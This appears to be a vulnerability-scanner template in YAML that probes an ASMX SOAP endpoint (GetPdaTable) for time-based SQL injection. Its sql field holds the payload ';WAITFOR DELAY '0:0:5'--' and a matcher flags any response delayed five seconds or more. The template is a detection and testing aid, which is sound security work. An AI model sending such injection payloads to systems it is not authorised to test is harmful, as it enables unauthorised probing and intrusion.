Fuzz/asmx-sql-injection.yaml

id: asmx-sql-injection

info:
  name: ASMX SQL Injection (WAITFOR DELAY)
  author: Vijay
  severity: high
  tags: sqli,soap,asmx

requests:
  - raw:
      - |
        POST {{BaseURL}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/GetPdaTable"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetPdaTable xmlns="http://tempuri.org/">
              <sql>;WAITFOR DELAY '0:0:5'--</sql>
            </GetPdaTable>
          </soap:Body>
        </soap:Envelope>
    
    matchers:
      - type: dsl
        dsl:
          - "duration>=5" # Detects time delay as an indication of SQL injection
